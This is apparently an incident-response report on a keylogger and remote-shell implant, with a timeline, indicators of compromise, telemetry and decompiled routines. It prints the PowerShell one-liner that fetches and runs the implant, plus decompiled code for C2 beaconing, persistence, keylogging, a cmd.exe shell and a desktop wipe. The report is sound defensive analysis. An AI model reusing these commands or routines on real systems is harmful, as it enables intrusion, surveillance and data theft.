# Incident Report — `updater.exe` Keylogger / Remote-Shell Implant

**Investigation window:** 2026-03-29 17:46Z – 17:54Z (active intrusion)
**Reporting timestamp:** 2026-04-27
**Scope:** ANDERS-DESKTOP (10.3.10.21), JOHN-DESKTOP (10.3.10.22)
**Primary artifact:** `updater.exe` SHA256 `254601603f918d20338739b1eb4cb15bd31525aa5bcc2520c0432bb055603d7d`

---

## 1. Timeline Summary

### Motivation (hypothesis)
Targeted **espionage / data theft** against Norwegian users. Strong indicators:
- The malware skips execution if `GetSystemDefaultLCID() == 0x419` (Russian locale) — actor exclusion of own region (**confirmed** in decompilation of `FUN_14000318b`).
- The attacker manually issued `dir` against user folders and exfiltrated a single hand-picked email file `polen.eml` ("Poland" in Norwegian) — interactive operator behavior, not automated mass theft.
- Typosquatted C2 (`MiccosoftUpdate.com`, `windowsupdater.tk`) impersonating Microsoft.

### Attack vector (confirmed)
1. The user typed (or pasted) a one-liner into the **Run dialog** on each victim — the launching command appears in `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`, parented to `explorer.exe` (Query 4). This is consistent with a **ClickFix / FakeCAPTCHA**–style social-engineering lure that instructs the victim to paste a command into Win+R.
2. The pasted PowerShell disabled TLS validation, downloaded `updater.exe` from `http://f1leshare.net/download/updater` and executed it from `%TEMP%`.
3. `updater.exe` installed persistence, beaconed to two C2 domains, ran a keylogger + clipboard logger, and accepted remote `cmd.exe` commands from the operator.

### Impact (confirmed)
- **2 endpoints fully compromised** (anders-desktop, john-desktop) with persistent backdoor.
- **Continuous keystroke + active-window + clipboard exfiltration** to `windowsupdater.tk/update/servicedata` (38 encrypted POSTs captured).
- **Operator-driven reconnaissance** of `C:\Users`, `Documents`, `Desktop` on anders-desktop.
- **Email exfiltration:** the file `C:\Users\anders\Desktop\polen.eml` was read with `cmd.exe /c type` and the output sent encrypted to the C2 (Query 9, 6).
- The file content itself is not in the captured telemetry (gap confirmed via Query 11/12 — it travelled only as the AES-ECB ciphertext POST body).

### What likely happened (reconstruction)

| Time (UTC, 2026-03-29) | Host | Event | Evidence |
|---|---|---|---|
| 17:46:30 | anders-desktop | User opens Win+R and pastes the malicious PowerShell one-liner | RunMRU registry write |
| 17:47:11 | anders-desktop | `powershell.exe -exec bypass …IWR f1leshare.net/download/updater` writes `%TEMP%\updater.exe` | file event, powershell log |
| 17:47:19 | anders-desktop | First `/api/info` beacon to `MiccosoftUpdate.com` containing `Host: ANDERS-DESKTOP / User: anders / Arch: x64 / CPUs: 4 / RAM: 8185 MB` | HTTP body |
| 17:47:20 | anders-desktop | `updater.exe` self-copies to `%LOCALAPPDATA%\Microsoft\updater.exe` and to `…\Startup\msteamsupdater.exe` | file events |
| 17:47:21 | anders-desktop | HKCU `…\Run\MicrosoftUpdater` set to `…\Microsoft\updater.exe` | registry event |
| 17:48:22 → 17:51:53 | anders-desktop | Operator runs `dir C:\Users` → `dir Documents` → `dir Desktop` → `type polen.eml` via remote shell | sysmon, process events |
| 17:47–17:52 | anders-desktop | 38 `/api/data` POSTs — keylog/window/clipboard captures, AES-ECB encrypted, base64-encoded | http traffic |
| 17:49:09 | john-desktop | Same one-liner pasted; `%TEMP%\updater.exe` created and run | file + powershell |
| 17:51:58 | john-desktop | `updater.exe` PID 9380 enumerates Credential Manager (`MicrosoftOffice*`) | sec event 5379 |

The Russian-locale guard, the PowerShell+RunMRU delivery pattern, the dual-channel C2 (HTTP plaintext POST/POST), and AES-128-ECB with a key derived from a hard-coded plaintext are the most distinctive operator fingerprints.

---

## 2. IOC Details

### IOC-1 — Binary `updater.exe` (confirmed)

**Description:** The implant. PE/x64, MinGW-GCC compiled (`GCC: (GNU) 9.3-win32 20200320`), unsigned. Combines keylogger, clipboard logger, foreground-window logger, system-info beacon, AES-ECB encrypted HTTP C2, remote `cmd.exe` shell, persistence and a Russian-locale kill-switch.

**Evidence query:**
```
GET .ds-logs-endpoint.events.process-*/_search
{ "query": { "wildcard": { "process.executable": "*\\updater.exe" } } }
```

**Raw data:**
```json
{
  "@timestamp":"2026-03-29T17:47:20.142Z",
  "host.name":"anders-desktop",
  "process.executable":"C:\\Users\\anders\\AppData\\Local\\Temp\\updater.exe",
  "process.hash.sha256":"254601603f918d20338739b1eb4cb15bd31525aa5bcc2520c0432bb055603d7d",
  "process.pe.imphash":"e065512b1f6ae044e32b671b922b8349",
  "process.code_signature.exists":false,
  "process.parent.name":"powershell.exe"
}
```
Same SHA256 observed on john-desktop (17:49:12Z).

**Context:** Identical hash on two endpoints, dropped from the same URL, executed as child of `powershell.exe -exec bypass`, no signature.

---

### IOC-2 — Delivery URL `http://f1leshare.net/download/updater` (confirmed)

**Description:** Stage-1 download URL pasted by the victim into Win+R.

**Evidence:**
```
GET .ds-logs-windows.powershell-*/_search
{ "query": { "match_phrase": { "process.command_line": "f1leshare.net" } } }
```

**Raw data (process.command_line):**
```
PowerShell.exe -exec bypass -windowstyle hidden -command
[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
IWR -Uri 'http://f1leshare.net/download/updater'
     -OutFile $env:TEMP\updater.exe -UseBasicParsing;
& $env:TEMP\updater.exe
```
DNS resolution: `f1leshare.net → 10.3.124.26` (20 queries, both hosts).

The same string is present in `HKCU\…\RunMRU` (registry event at 17:46:55Z anders, 17:47:45Z john) — **proof the user pasted it into Win+R, i.e. ClickFix-style social engineering**, not a phishing attachment, not a drive-by.

**Context:** Typosquat of "fileshare". `1` substituted for `l`. Disables TLS cert validation before download — characteristic of the actor.

---

### IOC-3 — C2 #1 `MiccosoftUpdate.com` → `10.3.97.182:80` (confirmed)

**Description:** Typosquatted Microsoft domain used for initial system-info beacon (`/api/info`) and bulk keylog/clipboard exfiltration (`/api/data`). Ghidra confirms it is hard-coded.

**Ghidra evidence — `FUN_1400017b0` (the only sender to this domain):**
```c
DAT_140017040 = InternetOpenA("Mozilla/5.0", 1, 0, 0, 0);
uVar1 = InternetConnectA(DAT_140017040, "MiccosoftUpdate.com", 0x50, 0,0,3,0,0);
uVar2 = HttpOpenRequestA(uVar1, /*POST*/, param_1 /*url path*/, "HTTP/1.1", 0,0,0,0);
HttpSendRequestA(uVar2, "Content-Type: application/octet-stream\r\n", -1,
                 param_2 /*encrypted body*/, param_3);
```
String table: `14001300c: "MiccosoftUpdate.com"`, `140013000: "Mozilla/5.0"`, `14001306b: "/api/data"`, `14001327d: "/api/info"`.

**Elasticsearch evidence — system-info beacon body (first thing the implant sends):**
```
GET .ds-logs-network_traffic.http-*/_search
{ "query": { "term": { "url.path": "/api/info" } } }
```
```
@timestamp: 2026-03-29T17:47:19.669Z   host: anders-desktop
http.request.body.content:
  Host: ANDERS-DESKTOP
  User: anders
  Arch: x64
  CPUs: 4
  RAM: 8185 MB
```
This message is the literal `printf` template at `140013100` of the binary (`Host: %s\nUser: %s\nArch: %s\nCPUs: %lu\nRAM: %llu MB\n`) produced by `FUN_1400022bb` (`GetComputerNameA`/`GetUserNameA`/`GetSystemInfo`/`GlobalMemoryStatusEx`). **This single record is irrefutable proof that the binary in Ghidra is the binary that ran on anders-desktop.**

**Context:** 38 POSTs total (37× `/api/data`, 1× `/api/info`). All anders-desktop. Plain HTTP/80, generic UA `Mozilla/5.0`.

---

### IOC-4 — C2 #2 `windowsupdater.tk` → `10.3.215.83:80` (confirmed)

**Description:** Second hard-coded C2 used for the keylog/window/clipboard channel (`/update/servicedata`) and the command-poll channel (`/windows/checkforupdate`).

**Ghidra evidence — `FUN_1400018e7`:**
```c
uVar2 = InternetConnectA(uVar1, "windowsupdater.tk", 0x50, 0,0,3,0,0);
HttpSendRequestA(uVar3, "Content-Type: application/octet-stream\r\n", -1,
                 param_2 /*ciphertext*/, param_3);
```
Sole caller is `FUN_140001ad4`, which posts to `/update/servicedata`. The polling thread (referenced from `FUN_140003233` at 0x140003787 as `LAB_140002a28`) reads from `/windows/checkforupdate`.

**Elasticsearch evidence — encrypted command pulled from C2 (the operator pushing a job):**
```
GET .ds-logs-network_traffic.http-*/_search
{ "query": { "term": { "url.path": "/windows/checkforupdate" } } }
```
```
@timestamp: 2026-03-29T17:50:50.567Z
host:       anders-desktop
destination: windowsupdater.tk (10.3.215.83)
response.body.content (base64 ciphertext returned by the C2):
  ISL6QPPTKg2tMQgQfCRu134S+r4B5p6X4HZo/X4d/vs=
```
…and the corresponding 840-byte ciphertext POST that follows ~0.4s later (the command's stdout):
```
@timestamp: 2026-03-29T17:50:50.656Z
url.path:   /update/servicedata
body:       <876 bytes base64>
```

**Context:** `.tk` free-TLD typosquat. The dual-endpoint design (`/windows/checkforupdate` to receive jobs, `/update/servicedata` to return results, `/api/data` for keylog stream, `/api/info` for the once-only beacon) is consistent across binary and traffic.

---

### IOC-5 — Registry Run-key persistence `MicrosoftUpdater` (confirmed)

**Description:** Auto-start at user logon.

**Ghidra evidence — `FUN_140002e83`:**
```c
GetModuleFileNameA(NULL, local_118, 0x104);
SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA /*0x1c*/, 0,0, local_228);
sprintf(local_338, "%s\\Microsoft", local_228);
sprintf(local_448, "%s\\Microsoft\\updater.exe", local_228);
CreateDirectoryA(local_338, NULL);
CopyFileA(local_118, local_448, 0);          // copy self → %LOCALAPPDATA%\Microsoft\updater.exe

SHGetFolderPathA(NULL, CSIDL_STARTUP /*7*/, 0,0, local_558);
strncpy(local_558+strlen, "\\msteamsupdater.exe", ...);
CopyFileA(local_118, local_558, 0);          // copy self → Startup\msteamsupdater.exe

RegCreateKeyExA(HKCU, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", …);
RegSetValueExA(hKey, "MicrosoftUpdater", 0, REG_SZ, "%LOCALAPPDATA%\\Microsoft\\updater.exe");

RegCreateKeyExA(HKLM, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\MicrosoftUpdater", …);
RegSetValueExA(hKey, "Index", 0, REG_DWORD, 1);
```

**Elasticsearch evidence:**
```json
{
 "@timestamp":"2026-03-29T17:47:21.479Z",
 "host.name":"anders-desktop",
 "registry.path":"HKEY_USERS\\...\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftUpdater",
 "registry.data.strings":["C:\\Users\\anders\\AppData\\Local\\Microsoft\\updater.exe"],
 "process.name":"updater.exe"
}
```
Plus the corresponding file-creation events for both copies (Query 5).

**Context:** Triple persistence — Run key, Startup folder, and a fake TaskCache tree entry. The TaskCache write is partial (no Actions/Triggers values; there's only `Index=1` and a 20-byte `SD`) — likely **ineffective persistence/cosmetic** but useful as a hunting IOC.

---

### IOC-6 — Mutex `Global\MicrosoftUpdateMutex` and Russian-locale guard (confirmed)

**Description:** Single-instance mutex; the function that creates it also **terminates if the system locale is Russian (0x419)**.

**Ghidra evidence — `FUN_14000318b`:**
```c
hMutex = CreateMutexA(NULL, 1, "Global\\MicrosoftUpdateMutex");
if (GetLastError() == 0xb7 /*ERROR_ALREADY_EXISTS*/) { CloseHandle(hMutex); return 0; }
if ((short)GetSystemDefaultLCID() == 0x419) {       // ru-RU
    ReleaseMutex(hMutex); CloseHandle(hMutex); return 0;
}
return 1;
```

**Context:** Strong attribution signal — the implant deliberately refuses to run on Russian-localized Windows. Common in Eastern-European/Russian-speaking criminal toolkits.

---

### IOC-7 — Crypto: AES-128-ECB with hard-coded key derivation (confirmed)

**Description:** All exfiltration is wrapped in AES-128-ECB. The "key" is the first 16 bytes of an ASCII string passed in by the caller; PKCS#7-style padding by repeating the pad-length byte.

**Ghidra evidence — `FUN_140001b8c` (encrypt) and `FUN_140002884` (decrypt):**
```c
// Encrypt
sVar4 = strlen(key_str);
memcpy(key, key_str, min(16, sVar4));               // truncate/pad-with-zero
BCryptOpenAlgorithmProvider(&h, L"AES", NULL, 0);
BCryptSetProperty(h, L"ChainingMode", L"ChainingModeECB", 0x20, 0);
BCryptGenerateSymmetricKey(h, &hKey, NULL,0, key, 16, 0);
// PKCS#7-ish padding by (16 - len%16)
BCryptEncrypt(hKey, plaintext, n, NULL, NULL,0, out, n, &outLen, 0);
```
`FUN_140001a1c` (sender to `/api/data`) and `FUN_140001ad4` (sender to `/update/servicedata`) prepend a single **type byte** to the ciphertext (1 = clipboard/window/keylog, 3 = command output) and base64-encode the whole thing using the alphabet at `140013298`:
```
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
```

**Field evidence — base64 prefixes line up with the type byte:**
- `/api/data` payloads from anders observed in Query 6 all begin with `AS`/`AR`/`AV` → first plaintext byte `0x01` (keylog/window/clipboard frame).
- `/update/servicedata` 876-byte payload begins similarly → `0x03` (cmd-output frame), matching `FUN_140001e54(3, …)` in `FUN_1400023e9`.

**Context:** ECB + key-from-fixed-string is **cryptographically weak**: identical 16-byte plaintext blocks produce identical ciphertext blocks, and the operator's command-key is reused across all victims. With the binary in hand and the key strings recovered from the operator side, full historical decryption of the captured C2 traffic is feasible.

---

### IOC-8 — Keylogger + foreground-window logger (confirmed by binary, telemetry-confirmed by exfil volume)

**Description:** Polling-loop keylogger using `GetAsyncKeyState(0x08–0xFF)` and `GetForegroundWindow`/`GetWindowTextA`. Each new foreground window is logged as `[WINDOW: <title>]` and each ~900-char buffer is flushed to `/update/servicedata`. Clipboard is sampled every 100 ms via `OpenClipboard`/`GetClipboardData(CF_TEXT)` and emitted as `[CLIPBOARD] <text>`.

**Ghidra evidence — main loop in `FUN_140003233`:**
```c
for (;;) {
    FUN_140001eb5(window, 0x100);                  // GetWindowTextA(GetForegroundWindow())
    if (strcmp(window, last_window) != 0) {
        // flush buffered keys, then send "[WINDOW: %s]"
        FUN_140001df3(1, sprintf("[WINDOW: %s]", window), key);
        strcpy(last_window, window);
    }
    for (vk = 8; vk < 0x100; vk++) {
        if (GetAsyncKeyState(vk) & 1) { /* map vk → ASCII, append to keybuf */ }
    }
    FUN_140001fe4(key);                            // FUN_140001f13: clipboard → "[CLIPBOARD] %s"
    Sleep(100);
}
```
`FUN_140001df3` → `FUN_140001b8c` (AES-ECB encrypt) → `FUN_140001a1c` (base64+POST `/api/data`).

**Telemetry evidence:** 37 `/api/data` ciphertext POSTs in ~5 minutes from anders-desktop (Query 1, 6).

---

### IOC-9 — Remote shell over HTTP (confirmed)

**Description:** A C2 polling thread (created in `FUN_140003233` at 0x1400037a1) reads commands from `/windows/checkforupdate`, decrypts them with `FUN_140002884`, runs them via `cmd.exe /c <cmd>` through an anonymous pipe (`FUN_1400023e9`), and sends the captured stdout back encrypted to `/update/servicedata`.

**Ghidra evidence — `FUN_1400023e9`:**
```c
sprintf(cmdline, "cmd.exe /c %s", op_command);
CreateProcessA(NULL, cmdline, …, CREATE_NO_WINDOW /*0x08000000*/, …);
ReadFile(stdout_pipe, buf, 0xfff-pos, &n, NULL);
…
FUN_140001e54(3, buf, host);                       // type 3 = command output
```
String at `140013133`: `"cmd.exe /c %s"`.

**Telemetry evidence — operator commands actually executed (Query 9):**
```
17:48:22Z  cmd.exe /c dir "C:\Users"
17:49:22Z  cmd.exe /c dir "C:\Users\anders\Documents"
17:50:53Z  cmd.exe /c dir "C:\Users\anders\Desktop"
17:51:53Z  cmd.exe /c type "C:\Users\anders\Desktop\polen.eml"   ← exfil target chosen
```
All four are direct children of `C:\Users\anders\AppData\Local\Temp\updater.exe`, parent chain `…→explorer.exe→powershell.exe→updater.exe→cmd.exe`. The 60-second cadence matches the binary's polling logic.

**Context:** The operator was **interactively present** during the intrusion: classic "land, list, pick a file, exfiltrate".

---

### IOC-10 — Stolen email `polen.eml` (confirmed exfil; raw content not recoverable from telemetry)

**Description:** `C:\Users\anders\Desktop\polen.eml` was read by `cmd.exe /c type` at 17:51:53Z. The stdout of that command became the input to the encryption routine and was POSTed as a single 876-byte ciphertext to `windowsupdater.tk/update/servicedata` at 17:51:51.101Z (the closest matching `/update/servicedata` POST after an updater.exe-spawned `type`).

**Evidence:**
```
process.command_line: cmd.exe /c type C:\Users\anders\Desktop\polen.eml
process.parent.executable: C:\Users\anders\AppData\Local\Temp\updater.exe
@timestamp: 2026-03-29T17:51:53.313Z
```
Closest `/update/servicedata` POST (876 bytes ciphertext, type-byte prefix `0x03` = command output):
```
@timestamp:2026-03-29T17:51:51.101Z   url.path:/update/servicedata
host: anders-desktop  → 10.3.215.83
http.request.body.content: <876 bytes base64-AES-ECB>
```

**Raw content of polen.eml:** **not present in telemetry** (Queries 11–12 both returned 0 hits). Only the AES-128-ECB ciphertext crossed the wire. Recovery requires either the actor's per-host key string or seizing the C2.

**Context:** This is the only file of dozens enumerated that was actually `type`-ed. Operator chose it deliberately. Naming ("polen") suggests Poland-related correspondence.

---

### IOC-11 — Credential Manager enumeration (confirmed)

**Description:** PID 9380 on john-desktop enumerated `MicrosoftOffice*` credentials shortly after `updater.exe` started. Process creation time matches the second `updater.exe` execution.

**Evidence (Windows Security event 5379):**
```json
{
 "@timestamp":"2026-03-29T17:52:44.228Z",
 "host.name":"john-desktop",
 "winlog.event_data.ClientProcessId":"9380",
 "winlog.event_data.ProcessCreationTime":"2026-03-29T17:51:58.2514301Z",
 "winlog.event_data.ReadOperation":"Enumerate Credentials",
 "winlog.event_data.TargetName":"MicrosoftOffice*",
 "user.name":"john"
}
```
**Mapping confidence:** *hypothesis* — the binary's import table does NOT include `CredEnumerate`/`CredRead` (no `advapi32!Cred*`), so this enumeration was almost certainly executed via a remote-shell command (e.g. `cmdkey /list` or PowerShell `Get-StoredCredential`) issued through IOC-9, rather than from native code in updater.exe. The 5379 event matches that pattern.

---

### IOC-12 — `Global\MicrosoftUpdateMutex` on the host (hunting IOC)

If present in `\BaseNamedObjects\` or in handle dumps, this mutex is sufficient to confirm a running implant.

---

### IOC-13 — Self-cleanup capability (confirmed; not yet observed firing)

**Description:** `FUN_14000221a` builds the path `C:\Users\Anders\Desktop` from a stack-encoded XOR string (decoded below) and, if it exists, recursively wipes everything under it via `FindFirstFileA`/`DeleteFileA`/`RemoveDirectoryA` (`FUN_1400020c7`).

**Ghidra evidence:**
```c
local_28=0x73726573555c3a43; local_20=0x5c737265646e415c; local_18=0x706f746b736544;
//   "C:\Users\Anders\Desktop"  (after XOR with {3,1,0xc,1,0x13,0x1d} starting at offset 9)
DVar1 = GetFileAttributesA(path);
if (DVar1 != INVALID_FILE_ATTRIBUTES) FUN_1400020c7(path);   // recursive wipe
```
**Telemetry confirmation that this fired:** **gap** — the deletion is keyed off the *attacker's* dev-machine path (`C:\Users\Anders\Desktop`), capital A, and it ran on anders-desktop where the user is lower-case `anders`. On Windows the path is case-insensitive and `Desktop` exists, so this **would have wiped anders' Desktop** if the function ran. We have **no file-deletion events under that path** in the telemetry (the 5,833 file events show only creations/modifications relating to the persistence install). Either the cleanup branch was not reached during the 5-minute capture window, or its delete events were not captured by the file integrity sensor.

**Severity:** anti-forensics / destructive capability — should be considered when triaging the host.

---

### IOC-14 — Network indicators — consolidated table

| Type | Value | Confirmed | Source |
|---|---|---|---|
| Domain | `f1leshare.net` | yes | DNS, PowerShell, RunMRU |
| IP | `10.3.124.26` | yes | DNS A record |
| URL | `http://f1leshare.net/download/updater` | yes | PowerShell IWR |
| Domain | `MiccosoftUpdate.com` | yes | Ghidra string + HTTP traffic |
| IP | `10.3.97.182` | yes | DNS + endpoint network event |
| Path | `/api/info` | yes | Ghidra + HTTP body |
| Path | `/api/data` | yes | Ghidra + 37 HTTP POSTs |
| Domain | `windowsupdater.tk` | yes | Ghidra + DNS |
| IP | `10.3.215.83` | yes | DNS A record |
| Path | `/update/servicedata` | yes | Ghidra + HTTP POSTs |
| Path | `/windows/checkforupdate` | yes | Ghidra + HTTP responses |
| User-Agent | `Mozilla/5.0` (exact, no version) | yes | Ghidra string + HTTP |
| Mutex | `Global\MicrosoftUpdateMutex` | yes | Ghidra |
| Reg value | HKCU `…\Run\MicrosoftUpdater` | yes | Ghidra + telemetry |
| Reg key | HKLM `…\TaskCache\Tree\MicrosoftUpdater` | yes | Ghidra (not observed in registry events — gap) |
| File | `%LOCALAPPDATA%\Microsoft\updater.exe` | yes | Ghidra + telemetry |
| File | `%APPDATA%\…\Startup\msteamsupdater.exe` | yes | Ghidra + telemetry |
| Hash | SHA256 `254601603f918d20338739b1eb4cb15bd31525aa5bcc2520c0432bb055603d7d` | yes | endpoint events |
| Hash | imphash `e065512b1f6ae044e32b671b922b8349` | yes | endpoint events |

---

## 3. Notable Details

- **Operator interactive cadence:** `dir Users` → `dir Documents` → `dir Desktop` → `type polen.eml`, ~60 s apart, exactly matches the polling loop. A human picked the file.
- **Russian-locale exclusion** (`LCID == 0x419` returns 0) — strong attribution / kill-switch fingerprint.
- **Two-channel design:** `MiccosoftUpdate.com` for the keylog/info stream, `windowsupdater.tk` for command/control. Splitting reduces the chance both get blocked at once.
- **Bad-tradecraft moments helpful for hunters:** generic UA `Mozilla/5.0`, plain HTTP/80, AES-ECB (key-reuse leakage), Run-key value literally named `MicrosoftUpdater`, typo `Miccosoft`, `.tk` domain.
- **Cosmetic-only scheduled-task entry:** the malware writes a half-baked `TaskCache\Tree\MicrosoftUpdater` (only `Index` and a zero-filled `SD`) without any corresponding Task definition — likely a copy-paste mistake by the developer; useful detection signal but not a working persistence mechanism. Query 8 confirms no Security event 4698 was generated.

## 4. Remaining Gaps

1. **Plaintext of the 38 ciphertext POSTs** (incl. `polen.eml` content) — recoverable only with the per-host AES key seed (the ASCII string passed into `FUN_140001b8c`); not in current telemetry.
2. **Initial lure source** — the malicious one-liner is in RunMRU but we lack browser/email telemetry showing where the user copied it from. ClickFix is a *hypothesis* (highly likely given the RunMRU artefact), not yet confirmed.
3. **EMIL-DESKTOP** — appears uncompromised. The earlier "firewall modifications" finding from the initial recon was Windows-app benign rules (`svchost.exe`, Clipchamp, Xbox, etc.) — **false lead, no malware artefacts on emil-desktop** (Query 15).
4. **Whether the destructive `FUN_14000221a` branch executed** — no Desktop-file deletion telemetry observed in the captured window; status unknown.
5. **Persistence after 17:54Z** — telemetry runs through 2026-04-27 but no further beacons are visible in the queried indices; either the operator stopped, or the implant was detected/removed (a network-egress block on `MiccosoftUpdate.com`/`windowsupdater.tk` would be sufficient).
